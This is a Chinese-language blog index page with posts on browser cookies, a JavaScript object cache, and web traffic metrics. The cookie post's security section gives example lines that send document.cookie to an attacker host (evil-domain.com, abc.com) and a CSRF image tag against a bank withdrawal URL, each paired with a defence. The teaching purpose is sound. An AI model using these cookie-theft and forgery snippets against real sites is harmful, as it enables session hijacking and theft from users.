<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/page/3/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">

  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-cookie" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/07/11/cookie/" class="article-date">
  <time class="dt-published" datetime="2019-07-11T03:20:45.000Z" itemprop="datePublished">2019-07-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/storage/">storage</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/07/11/cookie/">cookie</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="cookie概述"><a href="#cookie概述" class="headerlink" title="cookie概述"></a>cookie概述</h1><p>Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。</p>
<p>Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。</p>
<ul>
<li>对话（session）管理：保存登录、购物车等需要记录的信息。</li>
<li>个性化：保存用户的偏好，比如网页的字体大小、背景色等等。</li>
<li>追踪：记录和分析用户行为。</li>
</ul>
<p>有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。</p>
<p>Cookie 包含以下几方面的信息。</p>
<ul>
<li>Cookie 的名字</li>
<li>Cookie 的值（真正的数据写在这里面）</li>
<li>到期时间</li>
<li>所属域名（默认是当前域名）</li>
<li>生效的路径（默认是当前网址）</li>
</ul>
<p>举例来说，用户访问网址<strong><a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a></strong>时，这个 Cookie 就会包含<strong><a target="_blank" rel="noopener" href="http://www.example.com/">www.example.com</a></strong>这个域名，以及根路径/。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为/forums，那么这个 Cookie 只有在访问<strong><a target="_blank" rel="noopener" href="http://www.example.com/forums">www.example.com/forums</a></strong>及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。</p>
<p>浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。window.navigator.cookieEnabled属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 浏览器是否打开 Cookie 功能</span><br><span class="line">window.navigator.cookieEnabled // true</span><br></pre></td></tr></table></figure>

<p>document.cookie属性返回当前网页的 Cookie。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 当前网页的 Cookie</span><br><span class="line">document.cookie</span><br></pre></td></tr></table></figure>

<p>不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。</p>
<p>浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，<a target="_blank" rel="noopener" href="http://example.com设置的/">http://example.com设置的</a> Cookie，可以被<a target="_blank" rel="noopener" href="https://example.com读取./">https://example.com读取。</a></p>
<h1 id="Cookie-与-HTTP-协议"><a href="#Cookie-与-HTTP-协议" class="headerlink" title="Cookie 与 HTTP 协议"></a>Cookie 与 HTTP 协议</h1><p>Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。</p>
<h2 id="HTTP-响应：Cookie-的生成"><a href="#HTTP-响应：Cookie-的生成" class="headerlink" title="HTTP 响应：Cookie 的生成"></a>HTTP 响应：Cookie 的生成</h2><p>服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个Set-Cookie字段。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:foo=bar</span><br></pre></td></tr></table></figure>

<p>上面代码会在浏览器保存一个名为foo的 Cookie，它的值为bar。</p>
<p>HTTP 回应可以包含多个Set-Cookie字段，即在浏览器生成多个 Cookie。下面是一个例子。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-type: text/html</span><br><span class="line">Set-Cookie: yummy_cookie=choco</span><br><span class="line">Set-Cookie: tasty_cookie=strawberry</span><br><span class="line"></span><br><span class="line">[page content]</span><br></pre></td></tr></table></figure>

<p>除了 Cookie 的值，Set-Cookie字段还可以附加 Cookie 的属性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure</span><br><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly</span><br></pre></td></tr></table></figure>

<p>上面的几个属性的含义，将在后文解释。</p>
<p>一个Set-Cookie字段里面，可以同时包括多个属性，没有次序的要求。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly</span><br></pre></td></tr></table></figure>

<p>下面是一个例子。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure>

<p>如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的key、domain、path和secure都匹配。举例来说，如果原始的 Cookie 是用如下的Set-Cookie设置的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key1=value1; domain=example.com; path=/blog</span><br></pre></td></tr></table></figure>

<p>改变上面这个 Cookie 的值，就必须使用同样的Set-Cookie。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key1=value2; domain=example.com; path=/blog</span><br></pre></td></tr></table></figure>

<p>只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key1=value2; domain=example.com; path=/</span><br></pre></td></tr></table></figure>

<p>上面的命令设置了一个全新的同名 Cookie，但是path属性不一样。下一次访问example.com/blog的时候，浏览器将向服务器发送两个同名的 Cookie。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: key1=value1; key1=value2</span><br></pre></td></tr></table></figure>

<p>上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。</p>
<h2 id="HTTP-请求：Cookie-的发送"><a href="#HTTP-请求：Cookie-的发送" class="headerlink" title="HTTP 请求：Cookie 的发送"></a>HTTP 请求：Cookie 的发送</h2><p>浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的Cookie字段。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: foo=bar</span><br></pre></td></tr></table></figure>

<p>上面代码会向服务器发送名为foo的 Cookie，值为bar。</p>
<p>Cookie字段可以包含多个 Cookie，使用分号（;）分隔。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: name=value; name2=value2; name3=value3</span><br></pre></td></tr></table></figure>

<p>下面是一个例子。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /sample_page.html HTTP/1.1</span><br><span class="line">Host: www.example.org</span><br><span class="line">Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span><br></pre></td></tr></table></figure>

<p>服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。</p>
<ul>
<li>Cookie 的各种属性，比如何时过期。</li>
<li>哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。</li>
</ul>
<h1 id="Cookie-的属性"><a href="#Cookie-的属性" class="headerlink" title="Cookie 的属性"></a>Cookie 的属性</h1><h2 id="Expires，Max-Age"><a href="#Expires，Max-Age" class="headerlink" title="Expires，Max-Age"></a>Expires，Max-Age</h2><p>Expires属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用Date.prototype.toUTCString()进行格式转换。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure>

<p>如果不设置该属性，或者设为null，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。</p>
<p>Max-Age属性指定从现在开始 Cookie 存在的秒数，比如60 * 60 * 24 * 365（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。</p>
<p>如果同时指定了Expires和Max-Age，那么Max-Age的值将优先生效。</p>
<p>如果Set-Cookie字段没有指定Expires或Max-Age属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。</p>
<h2 id="Domain，Path"><a href="#Domain，Path" class="headerlink" title="Domain，Path"></a>Domain，Path</h2><p>Domain属性指定浏览器发出 HTTP 请求时，哪些域名要附带这个 Cookie。如果没有指定该属性，浏览器会默认将其设为当前域名，这时子域名将不会附带这个 Cookie。比如，example.com不设置 Cookie 的domain属性，那么sub.example.com将不会附带这个 Cookie。如果指定了domain属性，那么子域名也会附带这个 Cookie。如果服务器指定的域名不属于当前域名，浏览器会拒绝这个 Cookie。</p>
<p>Path属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，Path属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，PATH属性是/，那么请求/docs路径也会包含该 Cookie。当然，前提是域名必须一致。</p>
<h2 id="Secure，HttpOnly"><a href="#Secure，HttpOnly" class="headerlink" title="Secure，HttpOnly"></a>Secure，HttpOnly</h2><p>Secure属性指定浏览器只有在加密协议 HTTPS 下，才能将这个 Cookie 发送到服务器。另一方面，如果当前协议是 HTTP，浏览器会自动忽略服务器发来的Secure属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。</p>
<p>HttpOnly属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是document.cookie属性、XMLHttpRequest对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。</p>
<p>(new Image()).src = “<a target="_blank" rel="noopener" href="http://www.evil-domain.com/steal-cookie.php?cookie=&quot;">http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</a> + document.cookie;<br>上面是跨站点载入的一个恶意脚本的代码，能够将当前网页的 Cookie 发往第三方服务器。如果设置了一个 Cookie 的HttpOnly属性，上面代码就不会读到该 Cookie。</p>
<h1 id="document-cookie"><a href="#document-cookie" class="headerlink" title="document.cookie"></a>document.cookie</h1><p>document.cookie属性用于读写当前网页的 Cookie。</p>
<p>读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有HTTPOnly属性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie // &quot;foo=bar;baz=bar&quot;</span><br></pre></td></tr></table></figure>

<p>上面代码从document.cookie一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var cookies = document.cookie.split(&#x27;;&#x27;);</span><br><span class="line"></span><br><span class="line">for (var i = 0; i &lt; cookies.length; i++) &#123;</span><br><span class="line">  console.log(cookies[i]);</span><br><span class="line">&#125;</span><br><span class="line">// foo=bar</span><br><span class="line">// baz=bar</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>document.cookie属性是可写的，可以通过它为当前网站添加 Cookie。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &#x27;fontSize=14&#x27;;</span><br></pre></td></tr></table></figure>

<p>写入的时候，Cookie 的值必须写成key=value的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用encodeURIComponent方法达到。</p>
<p>但是，document.cookie一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &#x27;test1=hello&#x27;;</span><br><span class="line">document.cookie = &#x27;test2=world&#x27;;</span><br><span class="line">document.cookie</span><br><span class="line">// test1=hello;test2=world</span><br></pre></td></tr></table></figure>

<p>document.cookie读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，Cookie字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，Set-Cookie字段是一行设置一个 Cookie。</p>
<p>写入 Cookie 的时候，可以一起写入 Cookie 的属性。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &quot;foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT&quot;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，写入 Cookie 的时候，同时设置了expires属性。属性值的等号两边，也是不能有空格的。</p>
<p>各个属性的写入注意点如下。</p>
<ul>
<li>path属性必须为绝对路径，默认为当前路径。</li>
<li>domain属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是example.com，就不能将其设为foo.com。该属性默认为当前的一级域名（不含二级域名）。</li>
<li>max-age属性的值为秒数。</li>
<li>expires属性的值为 UTC 格式，可以使用Date.prototype.toUTCString()进行日期格式转换。</li>
</ul>
<p>document.cookie写入 Cookie 的例子如下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &#x27;fontSize=14; &#x27;</span><br><span class="line">  + &#x27;expires=&#x27; + someDate.toGMTString() + &#x27;; &#x27;</span><br><span class="line">  + &#x27;path=/subdirectory; &#x27;</span><br><span class="line">  + &#x27;domain=*.example.com&#x27;;</span><br></pre></td></tr></table></figure>

<p>Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。</p>
<p>删除一个现存 Cookie 的唯一方法，是设置它的expires属性为一个过去的日期。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &#x27;fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT&#x27;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，名为fontSize的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。</p>
<h1 id="safe"><a href="#safe" class="headerlink" title="safe"></a>safe</h1><p>多数网站使用cookie作为用户会话的唯一标识，因为其他的方法具有限制和漏洞。如果一个网站使用cookies作为会话标识符，攻击者可以通过窃取一套用户的cookies来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者的，因为用户和攻击者拥有相同的身份验证。 下面介绍几种cookie盗用和会话劫持的例子：</p>
<h2 id="网络窃听"><a href="#网络窃听" class="headerlink" title="网络窃听"></a>网络窃听</h2><p>网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式WIFI。这种流量包含在普通的未加密的HTTP清求上发送Cookie。在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含HTTP Cookie的全部内容，以便进行中间的攻击。比如：拦截cookie来冒充用户身份执行恶意任务（银行转账等）。</p>
<p>解决办法：服务器可以设置secure属性的cookie，这样就只能通过https的方式来发送cookies了。</p>
<h2 id="DNS缓存中毒"><a href="#DNS缓存中毒" class="headerlink" title="DNS缓存中毒"></a>DNS缓存中毒</h2><p>如果攻击者可以使DNS缓存中毒，那么攻击者就可以访问用户的Cookie了，例如：攻击者使用DNS中毒来创建一个虚拟的DNS服务<strong>h123456.<a target="_blank" rel="noopener" href="http://www.demo.com/">www.demo.com</a></strong>指向攻击者服务器的ip地址。然后攻击者可以从服务器 <strong>h123456.<a target="_blank" rel="noopener" href="http://www.demo.com/img_01.png">www.demo.com/img_01.png</a></strong> 发布图片。用户访问这个图片，由于 <strong><a target="_blank" rel="noopener" href="http://www.demo.com/">www.demo.com</a></strong>和<strong>h123456.<a target="_blank" rel="noopener" href="http://www.demo.com/">www.demo.com</a></strong>是同一个子域，所以浏览器会把用户的与<strong><a target="_blank" rel="noopener" href="http://www.demo.com/">www.demo.com</a></strong>相关的cookie都会发送到<strong>h123456.<a target="_blank" rel="noopener" href="http://www.demo.com/">www.demo.com</a></strong>这个服务器上，这样攻击者就会拿到用户的cookie搞事情。</p>
<p>一般情况下是不会发生这种情况，通常是网络供应商错误。</p>
<h2 id="跨站点脚本XSS"><a href="#跨站点脚本XSS" class="headerlink" title="跨站点脚本XSS"></a>跨站点脚本XSS</h2><p>使用跨站点脚本技术可以窃取cookie。当网站允许使用javascript操作cookie的时候，就会发生攻击者发布恶意代码攻击用户的会话，同时可以拿到用户的cookie信息。</p>
<p>例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;#&quot; onclick=`window.location=http://abc.com?cookie=$&#123;docuemnt.cookie&#125;`&gt;领取红包&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>当用户点击这个链接的时候，浏览器就会执行onclick里面的代码，结果这个网站用户的cookie信息就会被发送到abc.com攻击者的服务器。攻击者同样可以拿cookie搞事情。</p>
<p>解决办法：可以通过cookie的HttpOnly属性，设置了HttpOnly属性，javascript代码将不能操作cookie。</p>
<p>跨站请求伪造CSRF<br>例如，SanShao可能正在浏览其他用户XiaoMing发布消息的聊天论坛。假设XiaoMing制作了一个引用ShanShao银行网站的HTML图像元素，例如，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img  src = &quot;http://www.bank.com/withdraw?user=SanShao&amp;amount=999999&amp;for=XiaoMing&quot; &gt;</span><br></pre></td></tr></table></figure>

<p>如果SanShao的银行将其认证信息保存在cookie中，并且cookie尚未过期，(当然是没有其他验证身份的东西)，那么SanShao的浏览器尝试加载该图片将使用他的cookie提交提款表单，从而在未经SanShao批准的情况下授权交易。</p>
<p>解决办法：增加其他信息的校验（手机验证码，或者其他盾牌）。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/07/11/cookie/" data-id="ckw8thujo000re4d82pz6azrh" data-title="cookie" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%86%E4%BA%AB/" rel="tag">分享</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%BC%E8%88%AA/" rel="tag">导航</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-对象缓存" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/07/10/%E5%AF%B9%E8%B1%A1%E7%BC%93%E5%AD%98/" class="article-date">
  <time class="dt-published" datetime="2019-07-10T08:20:45.000Z" itemprop="datePublished">2019-07-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/storage/">storage</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/07/10/%E5%AF%B9%E8%B1%A1%E7%BC%93%E5%AD%98/">对象缓存</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="局部对象缓存"><a href="#局部对象缓存" class="headerlink" title="局部对象缓存"></a>局部对象缓存</h1><p>方法定义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let cache = &#123;&#125;</span><br><span class="line">export default &#123;</span><br><span class="line">  save (key, val) &#123;</span><br><span class="line">    cache[key] = val</span><br><span class="line">  &#125;,</span><br><span class="line">  load (key) &#123;</span><br><span class="line">    return cache[key]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import cache from &#x27;../cache&#x27;;</span><br><span class="line">data() &#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        cachelist: cache.load(CACHE_LIST_KEY) || [],</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">methods: &#123;</span><br><span class="line">    ajax(&#123;</span><br><span class="line">        url:,</span><br><span class="line">        method:,</span><br><span class="line">        data: &#123;&#125;,</span><br><span class="line">        success: function(res, status) &#123;</span><br><span class="line">            //存数据</span><br><span class="line">            cache.save(CACHE_LIST_KEY, info.obj[0].applist)</span><br><span class="line">        &#125;,</span><br><span class="line">        error:function()&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/07/10/%E5%AF%B9%E8%B1%A1%E7%BC%93%E5%AD%98/" data-id="ckw8thukm002se4d82fdfhksa" data-title="对象缓存" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%86%E4%BA%AB/" rel="tag">分享</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%BC%E8%88%AA/" rel="tag">导航</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-日活的各种指标" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/07/05/%E6%97%A5%E6%B4%BB%E7%9A%84%E5%90%84%E7%A7%8D%E6%8C%87%E6%A0%87/" class="article-date">
  <time class="dt-published" datetime="2019-07-05T02:27:22.000Z" itemprop="datePublished">2019-07-05</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/other/">other</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/07/05/%E6%97%A5%E6%B4%BB%E7%9A%84%E5%90%84%E7%A7%8D%E6%8C%87%E6%A0%87/">日活的各种指标</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="UV（Unique-visitor）"><a href="#UV（Unique-visitor）" class="headerlink" title="UV（Unique visitor）"></a>UV（Unique visitor）</h1><p>是指通过互联网访问、浏览这个网页的自然人。访问您网站的一台电脑客户端为一个访客。00:00-24:00内相同的客户端只被计算一次。一天内同个访客多次访问仅计算一个UV。</p>
<h1 id="IP（Internet-Protocol）"><a href="#IP（Internet-Protocol）" class="headerlink" title="IP（Internet Protocol）"></a>IP（Internet Protocol）</h1><p>独立IP是指访问过某站点的IP总数，以用户的IP地址作为统计依据。00:00-24:00内相同IP地址之被计算一次。</p>
<blockquote>
<p>UV与IP区别：如：你和你的家人用各自的账号在同一台电脑上登录新浪微博，则IP数+1，UV数+2。由于使用的是同一台电脑，所以IP不变，但使用的不同账号，所以UV+2 </p>
</blockquote>
<h1 id="PV（Page-View）"><a href="#PV（Page-View）" class="headerlink" title="PV（Page View）"></a>PV（Page View）</h1><p>即页面浏览量或点击量，用户每1次对网站中的每个网页访问均被记录1个PV。用户对同一页面的多次访问，访问量累计，用以衡量网站用户访问的网页数量。</p>
<h1 id="VV（Visit-View）"><a href="#VV（Visit-View）" class="headerlink" title="VV（Visit View）"></a>VV（Visit View）</h1><p>用以统计所有访客1天内访问网站的次数。当访客完成所有浏览并最终关掉该网站的所有页面时便完成了一次访问，同一访客1天内可能有多次访问行为，访问次数累计。</p>
<blockquote>
<p>PV与VV区别：如：你今天10点钟打开了百度，访问了它的三个页面；11点钟又打开了百度，访问了它的两个页面，则PV数+5，VV数+2.PV是指页面的浏览次数，VV是指你访问网站的次数。</p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/07/05/%E6%97%A5%E6%B4%BB%E7%9A%84%E5%90%84%E7%A7%8D%E6%8C%87%E6%A0%87/" data-id="ckw8thukj002ie4d8058m5okb" data-title="日活的各种指标" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%86%E4%BA%AB/" rel="tag">分享</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%BC%E8%88%AA/" rel="tag">导航</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-utils" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
